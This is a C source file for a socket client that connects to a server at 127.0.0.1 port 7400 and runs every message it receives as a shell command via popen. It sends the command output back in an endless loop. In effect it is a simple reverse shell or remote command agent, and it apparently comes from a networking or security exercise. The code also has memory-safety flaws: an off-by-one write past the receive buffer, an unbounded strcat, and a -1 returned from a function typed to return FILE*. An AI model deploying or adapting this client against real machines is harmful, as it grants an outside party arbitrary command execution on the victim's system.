#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "util.h"
#define MSG_SIZE 4096
#define MYPORT 7400
#define HOSTNAME "127.0.0.1"

FILE *recv_msg(int sockfd, int msg_size) {
  /* Receive and process messages from the server */
  char msg[msg_size];
  ssize_t bytes_received = recv(sockfd, msg, msg_size, 0);

  if (bytes_received < 0) {
    error_and_exit("Error reading from socket \n");
  } else if (bytes_received == 0) {
    error_and_exit("Server disconnected \n");
  } else {
    msg[bytes_received] = '\0'; // Null-terminate the received message
    printf("%s\n", msg);
    // Process the received  message here (e.g., execute commands)
    FILE *output_pipe = popen(msg, "r");
    if (!output_pipe) {
      printf("Error executing command\n");
      return -1;
    }

    return output_pipe;
  }
}

int main() {
  /* Create a socket for the client */
  int sockfd = open_tcp_socket();
  if (sockfd < 0) {
    error_and_exit("Error opening socket \n");
  }

  /* Get server's IP address */
  struct hostent *server = gethostbyname(HOSTNAME);
  if (server == NULL) {
    error_and_exit("Error: No such host \n");
  }

  struct sockaddr_in serv_addr = {
      .sin_family = AF_INET,
      .sin_port = (in_port_t)htons(MYPORT),
      .sin_addr = *(struct in_addr *)*server->h_addr_list,
  };

  try_connect(sockfd, serv_addr);

  printf("Connected to server.\n");

  char msg[MSG_SIZE];
  char results[MSG_SIZE];
  ssize_t bytes_received;

  while (1) {
    /* Receive and process messages from the server */
    bytes_received = recv(sockfd, msg, MSG_SIZE, 0);
    if (bytes_received < 0) {
      error_and_exit("Error reading from socket \n");
    } else if (bytes_received == 0) {
      error_and_exit("Server disconnected \n");
    } else {
      msg[bytes_received] = '\0'; // Null-terminate the received message
      printf("Received message from server: %s\n", msg);
      // Process the received  message here (e.g., execute commands)
      FILE *output_pipe = popen(msg, "r");
      if (!output_pipe) {
        printf("Error executing command\n");
        return -1;
      }

      // Read the output of the command and send it back to the server
      char output_buffer[MSG_SIZE];      // Adjust buffer size as needed
      char result_buffer[MSG_SIZE] = ""; // Initialize an empty string buffer
      while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
        strcat(result_buffer,
               output_buffer); // Append each line to the result buffer
      }

      printf("%s", result_buffer);
      printf("%ld\n", sizeof(result_buffer));

      // Send the result buffer back to the server
      if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
        printf("Error sending response to server\n");
        pclose(output_pipe);
        return -1;
      }

      fflush(stdout);      // Ensure the data is sent immediately
      pclose(output_pipe); // Close the output pipe
    }
  }
  /* Close the socket */
  close(sockfd);
  return 0;
}
